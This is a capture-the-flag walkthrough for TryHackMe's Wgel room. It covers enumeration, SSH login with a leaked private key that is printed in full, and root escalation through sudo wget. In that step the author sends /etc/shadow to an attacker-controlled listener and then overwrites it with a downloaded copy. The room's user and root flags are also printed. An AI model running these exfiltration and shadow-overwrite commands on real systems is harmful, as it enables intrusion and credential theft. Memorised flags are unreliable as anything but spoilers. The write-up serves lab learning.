# [Wgel CTF](https://tryhackme.com/room/wgelctf)

```
export IP=10.10.240.162
```

---

## Task 1
1. User flag

	a. Nmap scan (`nmap -sV -sC -oN nmap/initial $IP`):
	```
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
	|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
	|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Apache2 Ubuntu Default Page: It works
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	```

	b. Inspect http://$IP source code and you find this:
	```
	<!-- Jessie don't forget to udate the webiste -->
	```
	Maybe `jessie` is a username.

	c. Gobuster http://$IP (`gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt | tee gobuster-common.log`):
	```
	===============================================================
	Gobuster v3.1.0
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.240.162
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.1.0
	[+] Timeout:                 10s
	===============================================================
	2022/09/25 19:45:34 Starting gobuster in directory enumeration mode
	===============================================================
	/.hta                 (Status: 403) [Size: 278]
	/.htaccess            (Status: 403) [Size: 278]
	/.htpasswd            (Status: 403) [Size: 278]
	/index.html           (Status: 200) [Size: 11374]
	Progress: 2735 / 4615 (59.26%) 
	```

	d. Gobuster http://$IP/sitemap (`gobuster dir -u http://$IP/sitemap -w /usr/share/wordlists/dirb/common.txt | tee gobuster-common.log`):
	```
	===============================================================
	Gobuster v3.1.0
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.240.162/sitemap
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.1.0
	[+] Timeout:                 10s
	===============================================================
	2022/09/25 19:47:11 Starting gobuster in directory enumeration mode
	===============================================================
	/.hta                 (Status: 403) [Size: 278]
	/.htaccess            (Status: 403) [Size: 278]
	/.htpasswd            (Status: 403) [Size: 278]
	/.ssh                 (Status: 301) [Size: 321] [--> http://10.10.240.162/sitemap/.ssh/]
	Progress: 512 / 4615 (11.09%)
	```

	e. Found an RSA Private SSH key @ `http://$IP/sitemap/.ssh`. Saved it locally.
	```
	-----BEGIN RSA PRIVATE KEY-----
	MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
	m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
	W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
	y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
	+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
	Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
	/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
	AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
	M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
	SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
	2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
	p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
	7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
	dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
	GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
	shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
	uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
	LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
	QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
	V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
	hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
	9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
	eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
	QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
	jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
	-----END RSA PRIVATE KEY-----
	```

	f. Try to SSH with the private key:
	```
	# First have to change the file permissions:
	chmod 600 private-key

	# SSH command:
	ssh -i ./private-key jessie@$IP
	```

	g. Got in as `jessie`! Found the user.txt flag @ `/home/jessie/Documents/user_flag.txt`.
	```
	057c67131c3d5e42dd5cd3075b198ff6
	```


2. Root flag

	a. Checking `jessie`'s sudo privileges (`sudo -l`)
	```
	Matching Defaults entries for jessie on CorpOne:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User jessie may run the following commands on CorpOne:
	    (ALL : ALL) ALL
	    (root) NOPASSWD: /usr/bin/wget
	```

	b. GTFOBins wasn't super helpful. Meaning it didn't give me an immediate privilege escalation.

	c. After some digging, I found this article, [Wget Privilege Escalation](https://vk9-sec.com/wget-privilege-escalation/), which walked me through escalating my privileges...

	d. First had to copy the target machine's current `/etc/shadow` file to my machine so that I could view and modify a different version of it.
	```
	# On local machine:
	nc -lvp 9999

	# On target machine:
	sudo wget --post-file=/etc/shadow $MY_IP:9999

	# On local machine, you should see the contents of /etc/shadow outputted, like so:
	root:!:18195:0:99999:7:::
	daemon:*:17953:0:99999:7:::
	bin:*:17953:0:99999:7:::
	sys:*:17953:0:99999:7:::
	sync:*:17953:0:99999:7:::
	games:*:17953:0:99999:7:::
	man:*:17953:0:99999:7:::
	lp:*:17953:0:99999:7:::
	mail:*:17953:0:99999:7:::
	news:*:17953:0:99999:7:::
	uucp:*:17953:0:99999:7:::
	proxy:*:17953:0:99999:7:::
	www-data:*:17953:0:99999:7:::
	backup:*:17953:0:99999:7:::
	list:*:17953:0:99999:7:::
	irc:*:17953:0:99999:7:::
	gnats:*:17953:0:99999:7:::
	nobody:*:17953:0:99999:7:::
	systemd-timesync:*:17953:0:99999:7:::
	systemd-network:*:17953:0:99999:7:::
	systemd-resolve:*:17953:0:99999:7:::
	systemd-bus-proxy:*:17953:0:99999:7:::
	syslog:*:17953:0:99999:7:::
	_apt:*:17953:0:99999:7:::
	messagebus:*:17954:0:99999:7:::
	uuidd:*:17954:0:99999:7:::
	lightdm:*:17954:0:99999:7:::
	whoopsie:*:17954:0:99999:7:::
	avahi-autoipd:*:17954:0:99999:7:::
	avahi:*:17954:0:99999:7:::
	dnsmasq:*:17954:0:99999:7:::
	colord:*:17954:0:99999:7:::
	speech-dispatcher:!:17954:0:99999:7:::
	hplip:*:17954:0:99999:7:::
	kernoops:*:17954:0:99999:7:::
	pulse:*:17954:0:99999:7:::
	rtkit:*:17954:0:99999:7:::
	saned:*:17954:0:99999:7:::
	usbmux:*:17954:0:99999:7:::
	jessie:$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.:18195:0:99999:7:::
	sshd:*:18195:0:99999:7:::

	# Copy and paste them to a new local file, `target-shadow`.
	nano target-shadow 		# Then copy/paste.
	```

	e. Once `/etc/shadow` was on my machine, I could try to crack the hashed passwords for jessie and root OR I could just create new passwords and overwrite the target's `/etc/shadow` with my own using `wget`, which is what we'll do.

	f. First, let's update our local copy of `/etc/shadow`, `target-shadow`:
	```
	# Frst, create a new password that we'll know:
	mkpasswd --method=SHA-512 --stdin
		Password: ********

	# Take that outputted password hash and update the root entry in 'target-shadow' so it looks something like this:
	root:$6$zdIpG8jU1MM9Ufwq$HyvkJ4tuhNcOE5QLn9YzKrdmbom1tMnWGIDqVSSOej24DS/W0qt.iSaq062VA4sGOoEQBHQRkU/VJhZl1309n0:18195:0:99999:7:::
	...
	```

	g. Now, we'll pull `target-shadow` from the target machine and overwrite the current `/etc/shadow`.
	```
	# On local machine:
	python3 -m http.server

	# On target machine:
	sudo wget -O /etc/shadow http://$MY_IP:8000/target-shadow
	``` 

	h. With the new `/etc/shadow` file, we can switch to the root user since we now know the password.
	```
	# On target machine:
	su -
		Password: ********
	```

	i. We got root access! Root flag found @ `/root/root_flag.txt`:
	```
	b1b968b37519ad1daa6408188649263d
	```











